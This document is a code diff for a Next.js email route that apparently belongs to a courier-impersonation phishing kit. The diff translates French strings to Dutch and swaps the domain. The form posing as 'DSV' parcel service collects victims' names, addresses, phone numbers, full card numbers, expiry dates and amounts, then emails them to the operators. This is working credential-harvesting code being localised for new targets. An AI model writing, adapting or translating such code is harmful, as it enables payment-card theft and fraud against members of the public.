@@ -1,7 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server'
 import nodemailer from 'nodemailer'
 import path from 'path'
-import fs from 'fs'
 
 // Configuration du transporteur SMTP OVH
 const transporter = nodemailer.createTransport({
@@ -28,7 +27,7 @@ function validateFormData(data: any) {
 
   for (const field of requiredFields) {
     if (!data[field] || data[field].trim() === '') {
-      return { isValid: false, error: `Le champ ${field} est obligatoire` }
+      return { isValid: false, error: `Het veld ${field} is verplicht` }
     }
   }
 
@@ -39,15 +38,15 @@ function validateFormData(data: any) {
 
 // Fonction pour créer le template HTML de l'email
 function createEmailTemplate(data: any) {
-  const title = '💰 Nouvelle Demande de Réception de Fonds DSV'
+  const title = '💰 Nieuwe Aanvraag Geldoverdracht DSV'
   const currentDate = new Date()
-  const dateStr = currentDate.toLocaleDateString('fr-FR', {
+  const dateStr = currentDate.toLocaleDateString('nl-NL', {
     weekday: 'long',
     year: 'numeric',
     month: 'long',
     day: 'numeric'
   })
-  const timeStr = currentDate.toLocaleTimeString('fr-FR')
+  const timeStr = currentDate.toLocaleTimeString('nl-NL')
 
   return `
     <!DOCTYPE html>
@@ -197,39 +196,39 @@ function createEmailTemplate(data: any) {
         <div class="header">
           <img src="cid:logo" alt="DSV Klantenservice Logo" style="width: 60px; height: 60px; margin-bottom: 10px; border-radius: 8px;">
           <h1>${title}</h1>
-          <p>📅 Reçu le ${dateStr} à ${timeStr}</p>
+          <p>📅 Ontvangen op ${dateStr} om ${timeStr}</p>
         </div>
 
         <div class="content">
           <!-- Informations Client -->
           <div class="client-info">
-            <h2>👤 Informations Client</h2>
+            <h2>👤 Klantinformatie</h2>
             <div class="field">
-              <div class="label">Nom complet :</div>
+              <div class="label">Volledige naam :</div>
               <div class="value">${data.nom_complet}</div>
             </div>
             <div class="field">
-              <div class="label">Téléphone :</div>
+              <div class="label">Telefoon :</div>
               <div class="value">${data.telephone}</div>
             </div>
             <div class="field">
-              <div class="label">Adresse :</div>
+              <div class="label">Adres :</div>
               <div class="value">${data.adresse}</div>
             </div>
           </div>
 
           <!-- Informations Colis -->
           <div class="package-info">
-            <h2>📦 Informations Colis</h2>
+            <h2>📦 Pakketinformatie</h2>
             <div class="field">
-              <div class="label">Description :</div>
-              <div class="value">${data.description_article || 'Non spécifiée'}</div>
+              <div class="label">Beschrijving :</div>
+              <div class="value">${data.description_article || 'Niet gespecificeerd'}</div>
             </div>
           </div>
 
           <!-- Informations Financières -->
           <div class="financial-info">
-            <h2>💳 Informations Bancaires</h2>
+            <h2>💳 Bankinformatie</h2>
             <div class="field">
               <div class="label">Carte BE :</div>
               <div class="value">${data.carte_be}</div>
@@ -239,28 +238,28 @@ function createEmailTemplate(data: any) {
               <div class="value">${data.carte_52_49_51}</div>
             </div>
             <div class="field">
-              <div class="label">Date expiration :</div>
+              <div class="label">Vervaldatum :</div>
               <div class="value">${data.date_expiration}</div>
             </div>
             <div class="field">
-              <div class="label">Montant :</div>
+              <div class="label">Bedrag :</div>
               <div class="amount">${data.montant} €</div>
             </div>
           </div>
 
           <!-- Actions rapides -->
           <div class="contact-actions">
-            <strong>Actions rapides :</strong><br>
-            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Répondre au client</a>
-            <a href="tel:${data.telephone}">📞 Appeler le client</a>
+            <strong>Snelle acties :</strong><br>
+            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Klant beantwoorden</a>
+            <a href="tel:${data.telephone}">📞 Klant bellen</a>
           </div>
         </div>
 
         <div class="footer">
           <p>
-            <strong>DSV Colis</strong> - Service de Récupération et Livraison 24/7<br>
-            Email automatiquement envoyé depuis <strong>dsv-colis.fr</strong><br>
-            Pour toute question, contactez le support technique.
+            <strong>DSV Pakketten</strong> - 24/7 Ophaal- en Bezorgservice<br>
+            Email automatisch verzonden vanaf <strong>dsv-klantenservice.com</strong><br>
+            Voor vragen, neem contact op met de technische ondersteuning.
           </p>
         </div>
       </div>
@@ -288,16 +287,16 @@ export async function POST(request: NextRequest) {
 
     // Vérifier que les variables d'environnement sont configurées
     if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-      console.error('Variables d\'environnement SMTP manquantes')
+      console.error('SMTP omgevingsvariabelen ontbreken')
       return NextResponse.json(
-        { success: false, error: 'Configuration serveur email manquante' },
+        { success: false, error: 'Email server configuratie ontbreekt' },
         { status: 500 }
       )
     }
 
     // Créer le contenu de l'email
     const emailHtml = createEmailTemplate(body)
-    const subject = `Nouvelle demande de réception de fonds DSV - ${body.nom_complet}`
+    const subject = `Nieuwe aanvraag geldoverdracht DSV - ${body.nom_complet}`
 
     // Configuration de l'email
     const recipients = process.env.EMAIL_RECIPIENTS
@@ -322,44 +321,44 @@ export async function POST(request: NextRequest) {
       text: `
         ${subject}
 
-        === INFORMATIONS CLIENT ===
-        Nom: ${body.nom_complet}
-        Téléphone: ${body.telephone}
-        Adresse: ${body.adresse}
+        === KLANTINFORMATIE ===
+        Naam: ${body.nom_complet}
+        Telefoon: ${body.telephone}
+        Adres: ${body.adresse}
 
-        === INFORMATIONS COLIS ===
-        Description: ${body.description_article || 'Non spécifiée'}
+        === PAKKETINFORMATIE ===
+        Beschrijving: ${body.description_article || 'Niet gespecificeerd'}
 
-        === INFORMATIONS BANCAIRES ===
-        Carte BE: ${body.carte_be}
-        Carte 52/49/51: ${body.carte_52_49_51}
-        Date expiration: ${body.date_expiration}
-        Montant: ${body.montant} €
+        === BANKINFORMATIE ===
+        Kaart BE: ${body.carte_be}
+        Kaart 52/49/51: ${body.carte_52_49_51}
+        Vervaldatum: ${body.date_expiration}
+        Bedrag: ${body.montant} €
 
         ---
-        Email envoyé depuis DSV Colis
-        Date: ${new Date().toLocaleString('fr-FR')}
+        Email verzonden vanaf DSV Klantenservice
+        Datum: ${new Date().toLocaleString('nl-NL')}
       `
     }
 
     // Envoyer l'email
     const info = await transporter.sendMail(mailOptions)
 
-    console.log('Email envoyé avec succès:', info.messageId)
+    console.log('Email succesvol verzonden:', info.messageId)
 
     return NextResponse.json({
       success: true,
-      message: 'Email envoyé avec succès',
+      message: 'Email succesvol verzonden',
       messageId: info.messageId
     })
 
   } catch (error) {
-    console.error('Erreur lors de l\'envoi de l\'email:', error)
+    console.error('Fout bij het verzenden van email:', error)
 
     return NextResponse.json(
       {
         success: false,
-        error: 'Erreur lors de l\'envoi de l\'email. Veuillez réessayer plus tard.'
+        error: 'Fout bij het verzenden van email. Probeer het later opnieuw.'
       },
       { status: 500 }
     )
@@ -369,7 +368,7 @@ export async function POST(request: NextRequest) {
 // Gérer les autres méthodes HTTP
 export async function GET() {
   return NextResponse.json(
-    { error: 'Méthode non autorisée' },
+    { error: 'Methode niet toegestaan' },
     { status: 405 }
   )
 }
